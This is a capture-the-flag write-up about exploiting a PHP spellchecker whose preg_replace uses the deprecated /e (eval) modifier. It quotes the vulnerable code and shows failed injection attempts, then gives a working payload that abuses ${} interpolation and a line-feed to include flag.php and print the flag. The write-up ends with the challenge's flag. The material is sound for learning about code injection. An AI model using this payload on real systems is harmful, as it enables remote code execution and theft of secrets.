
### Clues
- `<!-- If I had to guess, I would say that the $flag is defined in flag.php -->`
- `Our spellchecker is a bit slow, do not DoS it please.`

### Directions
1. `preg_replace` seems to be making an `eval` statement (e = eval):
```PHP
require 'spell.php';  # implement the "correct($word)" function  
  
$q = substr ($_REQUEST['q'], 0, 256);  # Our spellchecker is a bit slow, do not DoS it please.  
$blacklist = implode (["'", '"', '(', ')', ' ', '`']);  
  
$corrected = preg_replace ("/([^$blacklist]{2,})/ie", 'correct ("\\1")', $q);
```
This function uses the `e` modifier - deprecated for security reasons:
> When using the deprecated `e` modifier, this function escapes some characters (namely `'`, `"`, `\` and NULL) in the strings that replace the backreferences. This is done to ensure that no syntax errors arise from backreference usage with either single or double quotes (e.g. `'strlen(\'$1\')+strlen("$2")'`). Make sure you are aware of PHP's [string syntax](https://devdocs.io/php/language.types.string) to know exactly how the interpreted string will look. 
- Writing code inside ${}  will be ran.

- Why does this work?
```
INPUT: Arnold once said: "I\'ll be back"
OUTPUT: arnold once laid "ab'll be back"

INPUT:  "); echo $q;
OUTPUT: "); echo "); echo $q;;
# echo works natively because correct("echo") === "echo", but other functions fail
```
- But this doesn't?
```
INPUT: "); include 'flag.php'; echo $flag;
OUTPUT: "); include 'flag.php'; echo a
ERROR: **Notice**: Undefined variable: flag in **/index.php(44) : regexp code** on line **1**
```
Too many variables to look for and too many uncertainties.

Was stuck for quite a bit trying to execute code regularely, then I remembered we also have the `${}` syntax. This helps us for:
- echoing without using a command (just `$flag` after include)
- Avoid using strings and spaces
	- `$_REQUEST[0]` instead of `'flag.php'` 
	- ~~urlencode  the space in include` ` - `${include%20$_REQUEST[0]}`~~ doesn't work 
		- somehow different whitespace works!! Line feed (`\n` or `%0A`) work
		- [ ] therefore we can include with `${include%0A$_REQUEST[0]}`
```
q=${include%0A$_REQUEST[0]}$flag&0=flag.php&submit=
```

# Solution
```
WEBSEC{Writing_a_sp3llcheckEr_in_php_aint_no_fun}
```